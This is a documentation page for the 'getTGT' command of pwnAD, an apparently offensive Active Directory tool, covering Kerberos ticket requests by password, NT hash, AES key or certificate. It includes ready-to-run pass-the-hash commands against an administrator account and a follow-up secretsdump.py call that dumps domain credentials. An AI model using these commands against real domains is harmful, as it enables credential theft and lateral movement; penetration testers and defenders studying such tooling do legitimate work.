# getTGT

Obtain a Kerberos Ticket Granting Ticket (TGT).

## Usage

```bash
pwnAD [auth options] getTGT
```

## Description

The `getTGT` action performs a Kerberos AS-REQ to obtain a TGT for the authenticated user. The TGT is saved to a `.ccache` file that can be used for further Kerberos operations.

## Authentication Methods

| Method | Flags | Description |
|--------|-------|-------------|
| Password | `-p` | Standard Kerberos authentication |
| NT Hash | `-H` | Overpass-the-Hash / Pass-the-Key |
| AES Key | `--aes-key` | Pass-the-Key with AES |
| Certificate | `-pfx` or `-cert -key` | PKINIT authentication |

## Examples

### Password Authentication

```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Password123!' getTGT
[*] Trying to get TGT...
[*] Saving ticket in administrator.ccache
```

### Pass-the-Hash (Overpass-the-Hash)

```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -H ':31d6cfe0d16ae931b73c59d7e0c089c0' getTGT
[*] Trying to get TGT...
[*] Saving ticket in administrator.ccache
```

### AES Key

```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator --aes-key '4a3e8a5c...' getTGT
[*] Trying to get TGT...
[*] Saving ticket in administrator.ccache
```

### Certificate (PKINIT)

```bash
# PFX file
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx admin.pfx getTGT
[*] Trying to get TGT...
[*] Saving ticket in administrator.ccache

# PFX with password
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx admin.pfx -pfx-pass 'PfxPass!' getTGT

# Separate cert and key
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -cert admin.crt -key admin.key getTGT
```

## Using the TGT

After obtaining a TGT, set `KRB5CCNAME` to use it:

```bash
export KRB5CCNAME=administrator.ccache

# Use with pwnAD
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -k get users

# Use with Impacket tools
secretsdump.py -k -no-pass domain.local/administrator@dc01.domain.local
smbclient.py -k -no-pass domain.local/administrator@dc01.domain.local
```

## Interactive Mode

```bash
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Pass!'

pwnAD [domain.local\administrator]> getTGT
[*] Trying to get TGT...
[*] Saving ticket in administrator.ccache

# Set environment variable from within pwnAD
pwnAD [domain.local\administrator]> !export KRB5CCNAME=administrator.ccache
```

## Output

The TGT is saved as `<username>.ccache` in the current directory.

## Technical Details

### AS-REQ/AS-REP

1. Client sends AS-REQ with:
    - Username (cname)
    - Realm (domain)
    - Pre-authentication data (encrypted timestamp or PKINIT)
2. KDC responds with AS-REP containing:
    - TGT (encrypted with krbtgt key)
    - Session key (encrypted with user's key or certificate)

### PKINIT Flow

When using certificate authentication:

1. Client sends AS-REQ with PA-PK-AS-REQ containing:
    - Signed authentication data
    - Client certificate
2. KDC validates certificate and responds with PA-PK-AS-REP
3. Session key is derived from Diffie-Hellman exchange

## Troubleshooting

### "KDC_ERR_PREAUTH_FAILED"

Pre-authentication failed. Check:

- Password/hash is correct
- Username is correct (case-sensitive)
- Domain is correct

### "KDC_ERR_C_PRINCIPAL_UNKNOWN"

User not found in the domain. Verify:

- Username spelling
- User exists in the domain

### "KDC_ERR_CLIENT_REVOKED"

Account is disabled or locked. Check account status.

### "KRB_AP_ERR_SKEW"

Time difference between client and KDC is too large. Sync your clock:

```bash
sudo ntpdate <dc-ip>
```
